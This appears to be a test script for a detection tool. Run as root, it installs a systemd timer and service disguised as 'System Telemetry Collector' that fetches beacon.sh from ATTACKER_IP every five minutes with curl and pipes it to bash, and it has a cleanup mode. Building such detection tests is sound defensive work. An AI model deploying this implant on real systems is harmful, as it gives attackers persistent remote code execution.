#!/usr/bin/env bash
# Systemd timer persistence: a timer + service pair that fires every 5 minutes.
# Detected by: defender-cli anti-persistence --systemd-timers
set -euo pipefail
[[ $EUID -eq 0 ]] || { echo "[!] Requires root"; exit 1; }

ATTACKER_IP="${ATTACKER_IP:-10.0.0.1}"
ATTACKER_PORT="${ATTACKER_PORT:-4444}"
SERVICE="defender-test-timer.service"
TIMER="defender-test-timer.timer"
SERVICE_FILE="/etc/systemd/system/$SERVICE"
TIMER_FILE="/etc/systemd/system/$TIMER"
TAG="DEFENDER-TEST-timer"

case "${1:-}" in
  deploy)
    cat > "$SERVICE_FILE" << EOF
[Unit]
Description=System Telemetry Collector
# $TAG

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'curl -s http://${ATTACKER_IP}:${ATTACKER_PORT}/beacon.sh | bash'
EOF
    cat > "$TIMER_FILE" << EOF
[Unit]
Description=System Telemetry Timer
# $TAG

[Timer]
OnBootSec=1min
OnUnitActiveSec=5min

[Install]
WantedBy=timers.target
EOF
    systemctl daemon-reload
    systemctl enable --now "$TIMER" 2>/dev/null || true
    echo "[+] 13_systemd_timer: $TIMER installed and enabled"
    ;;
  cleanup)
    systemctl disable --now "$TIMER" 2>/dev/null || true
    rm -f "$SERVICE_FILE" "$TIMER_FILE"
    systemctl daemon-reload
    echo "[-] 13_systemd_timer: removed"
    ;;
  *) echo "Usage: $0 deploy|cleanup"; exit 1 ;;
esac
